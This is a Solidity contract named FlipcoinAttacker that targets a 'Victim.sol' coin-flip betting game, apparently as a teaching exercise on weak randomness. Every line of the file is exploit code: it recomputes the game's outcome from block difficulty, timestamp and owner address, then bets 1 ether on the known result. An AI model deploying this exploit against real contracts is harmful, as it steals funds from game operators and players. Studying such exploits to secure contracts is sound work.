// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract FlipcoinAttacker {
    Flipcoin flipGame;

    constructor(address payable _flipGameAddress) {
        flipGame = Flipcoin(_flipGameAddress);
    }

    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, flipGame.owner()))) % 2;
    }

    function Attack() public payable {
        uint256 guess = random();
        flipGame.flip{value: 1 ether}(guess);
    }

    receive() external payable {}
}
